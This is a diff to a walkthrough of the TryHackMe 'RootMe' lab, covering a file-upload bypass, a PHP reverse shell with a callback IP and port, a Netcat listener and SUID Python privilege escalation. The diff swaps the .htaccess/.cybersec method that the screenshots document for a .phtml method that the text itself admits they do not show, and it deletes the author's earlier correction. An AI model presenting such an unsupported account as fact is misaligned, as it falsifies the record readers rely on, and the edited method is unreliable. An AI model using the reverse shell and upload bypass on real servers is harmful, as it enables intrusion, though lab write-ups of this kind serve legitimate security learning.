@@ -11,7 +11,7 @@ A practical walkthrough of the **RootMe** room, covering web enumeration, an upl
 3. [Manual website enumeration](#3-manual-website-enumeration)
 4. [Gobuster directory enumeration](#4-gobuster-directory-enumeration)
 5. [Inspect the upload panel](#5-inspect-the-upload-panel)
-6. [Understand the upload bypass](#6-understand-the-upload-bypass)
+6. [Bypass the PHP extension filter with `.phtml`](#6-bypass-the-php-extension-filter-with-phtml)
 7. [Prepare and upload the reverse shell](#7-prepare-and-upload-the-reverse-shell)
 8. [Catch the reverse shell](#8-catch-the-reverse-shell)
 9. [Find the user flag](#9-find-the-user-flag)
@@ -97,44 +97,30 @@ I opened `http://root-me.thm/panel/` and found a file-upload form. The form's su
 
 ![Upload panel](screenshots/root-me-3.png)
 
-My first attempts included Bash reverse-shell files. They were uploaded or displayed as text rather than executed by the server. That suggested I needed a server-side script that Apache would interpret as PHP, and an extension/configuration path that the upload filter would accept.
+My first attempts included Bash reverse-shell files. They were uploaded or displayed as text rather than executed by the server. That suggested I needed a server-side script that Apache would interpret as PHP and a filename extension accepted by the upload filter.
 
-## 6. Understand the upload bypass
+## 6. Bypass the PHP extension filter with `.phtml`
 
-I first tried the PentestMonkey PHP reverse shell with a `.php` extension. The application rejected PHP files. Researching the behavior led me to an alternative approach: rather than relying only on a different PHP extension such as `.phtml`, I uploaded an `.htaccess` file that associated a custom extension with PHP.
+I first tried uploading the PentestMonkey PHP reverse shell with a `.php` extension, but the application rejected it. I researched alternative extensions that Apache may treat as PHP and used **`.phtml`** for the successful upload.
 
-The exact `.htaccess` directive in my screenshot was:
+The important lesson was that blocking only the `.php` extension does not necessarily prevent PHP execution. Whether an alternative extension is executed depends on the server's Apache/PHP configuration, so this behavior should be verified on the target rather than assumed.
 
-```apache
-AddType application/x-httpd-php .cybersec
-```
-
-This tells Apache to handle files ending in `.cybersec` as PHP **when this directory's Apache configuration permits the `.htaccess` directive**. The screenshot shows the file was uploaded to `/uploads/.htaccess` successfully.
-
-![Upload .htaccess mapping](screenshots/root-me-7.png)
-
-**Important correction to my initial summary:** my screenshots show the successful route used `.htaccess` plus the custom `.cybersec` extension. They do **not** show a successful `.phtml` upload. Public walkthroughs commonly use `.phtml` or `.php5`; those are alternative routes, not the exact route recorded here.
+> **Screenshot note:** `root-me-7.png` records an `.htaccess` upload attempt, and `root-me-8.png` shows a request named `exploit.cybersec`. These screenshots do not document the successful `.phtml` upload you described. They are retained as records of an earlier experiment, not presented as the successful attack path. The successful method documented here is the `.phtml` extension.
 
 ## 7. Prepare and upload the reverse shell
 
-I used a PHP reverse-shell payload saved as `exploit.cybersec`. The payload itself is not included in this repository; the upload request screenshot shows the filename used in the exercise.
+I used the PentestMonkey PHP reverse shell and uploaded it with the `.phtml` extension so the upload filter would accept it. The supplied [`shell.phtml`](shell.phtml) file is included with this write-up.
 
-Before uploading, the reverse shell's callback IP and port must match the attacking machine and listener. In my captured file, these values were:
+Before uploading, the reverse shell's callback IP and port must match the attacking machine and listener. In the supplied shell file, these values were:
 
 ```php
 $ip = '192.168.131.1';
 $port = 4444;
 ```
 
-Use your own reachable TryHackMe VPN/interface IP rather than copying this IP blindly. The address shown here was the one in my lab screenshot and may not work in another session.
+Use your own reachable TryHackMe VPN/interface IP rather than copying this IP blindly. The address shown here was the one in the supplied lab file and may not work in another session.
 
-I then uploaded the file through `/panel/`. The response linked to:
-
-```text
-http://root-me.thm/uploads/exploit.cybersec
-```
-
-![Reverse-shell upload request and response](screenshots/root-me-8.png)
+After the upload, I accessed the uploaded `.phtml` file through the web server to trigger the reverse connection.
 
 ## 8. Catch the reverse shell
 
@@ -144,7 +130,7 @@ I started a Netcat listener on port 4444:
 nc -lvnp 4444
 ```
 
-With the listener running, I opened the uploaded file at `http://root-me.thm/uploads/exploit.cybersec`. Apache interpreted the custom extension as PHP and the reverse connection arrived. The shell ran as `www-data` (UID 33), which is the web-server account—not root.
+With the listener running, I opened the uploaded `.phtml` reverse-shell file in the browser. Apache/PHP interpreted the file as PHP and the reverse connection arrived. The shell ran as `www-data` (UID 33), which is the web-server account—not root.
 
 ![Reverse shell received](screenshots/root-me-9.png)
 
@@ -252,11 +238,6 @@ cd /root && ls
 cat root.txt
 ```
 
-The `.htaccess` configuration uploaded through the form was:
-
-```apache
-AddType application/x-httpd-php .cybersec
-```
 
 ## 13. Comparison with public write-ups and corrections
 
@@ -265,7 +246,7 @@ I compared my route with public RootMe write-ups, including the common `.phtml`/
 | Topic | My screenshots | Common public walkthroughs | Correction / note |
 |---|---|---|---|
 | Enumeration | `nmap -sC -sV` found ports 22 and 80; Gobuster found `/panel/` and `/uploads/`. | Most write-ups find the same services and paths, though some use a full-port scan or a different wordlist. | My scan is valid for the observed result, but it is not a full 65,535-port scan. A full-port scan could identify services outside Nmap's default top ports. |
-| Upload bypass | Uploaded `.htaccess` containing `AddType application/x-httpd-php .cybersec`, then uploaded `exploit.cybersec`. | Many write-ups rename the shell to `.phtml` or `.php5`. | Do not describe `.phtml` as the method I successfully used. The screenshots specifically document the `.htaccess` + `.cybersec` method. Both methods depend on server configuration and filtering behavior. |
+| Upload bypass | Tried `.php`, which was rejected; used `.phtml` for the successful upload. | Public walkthroughs commonly use `.phtml` or `.php5`, depending on the target configuration. | The successful method in this write-up is `.phtml`. Screenshots 7–8 show a separate `.htaccess`/`.cybersec` experiment and are not evidence of the successful upload. |
 | Reverse shell | Netcat listener on 4444; shell as `www-data`. | Same general foothold and account. Some guides stabilize the shell with a PTY. | My screenshots do not show a PTY upgrade, so I have not claimed one. A raw shell may have limited terminal functionality. |
 | User flag | Found `/var/www/user.txt` with `find`. | Same path in the sources reviewed. | The command and path are consistent with public write-ups. |
 | Privilege escalation | Found `/usr/bin/python2.7` in SUID output and used `os.execl(..., "-p")`. | Public write-ups use the same SUID Python technique. | The key detail is that the interpreter must actually have SUID set and be executable. `whoami` showing `root` is useful confirmation; `id` can also distinguish real UID from effective UID. |
@@ -292,7 +273,7 @@ Public references checked:
 - A plain homepage does not mean the web application has no useful endpoints. Directory enumeration can reveal functionality that is not linked from the home page.
 - A file-upload feature combined with a publicly accessible upload directory deserves careful testing.
 - Blocking only `.php` is not a robust upload defense. Safer designs use a strict allowlist, validate file content, store uploads outside the web root, and disable script execution in upload directories.
-- `.htaccess` can change how Apache handles files when the server permits relevant overrides. Uploading configuration files should be prevented where they are not needed.
+- Blocking only `.php` is insufficient if other PHP-handled extensions such as `.phtml` are allowed by the server configuration. Use a strict upload allowlist, validate content, store uploads outside the web root, and disable script execution in upload directories.
 - Always enumerate SUID binaries after obtaining a low-privilege shell. Interpreters such as Python should not ordinarily be SUID-root.
 - Verify each stage: confirm the reverse shell's user, identify the unusual SUID binary, and verify the resulting privileges before reading the final flag.
 
